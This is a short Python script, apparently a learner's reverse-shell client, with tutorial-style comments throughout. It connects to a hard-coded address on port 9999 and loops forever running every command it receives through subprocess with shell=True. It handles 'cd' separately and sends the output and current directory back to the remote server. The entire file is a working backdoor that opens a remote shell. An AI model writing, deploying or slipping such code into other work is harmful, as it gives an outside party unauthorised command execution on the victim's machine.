import socket   #Library for creating a socket
import os       # Operating system functions use
import subprocess   #Subprocess is functions in windows

s = socket.socket()   #Creating a socket
host = '192.168.1.203'    #Locally testing purpose 
port = 9999    #same as server

s.connect((host, port))     # remotely connecting to an existing socket with connect().

while True:      #Infinite loop here, ecplain the why
    data = s.recv(1024)      #receiving data 
    if data[:2].decode("utf-8") == 'cd':                       #Data is transferred in the form of bytes therefore decode, utf8 is just a character format,
                                                             #What this does is it takes the first 2 characters and checks if they are cd or not
        os.chdir(data[3:].decode("utf-8"))                  #Get the rest of the data after the 3rd character

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))                    #encode the data to send it to the server

        print(output_str)
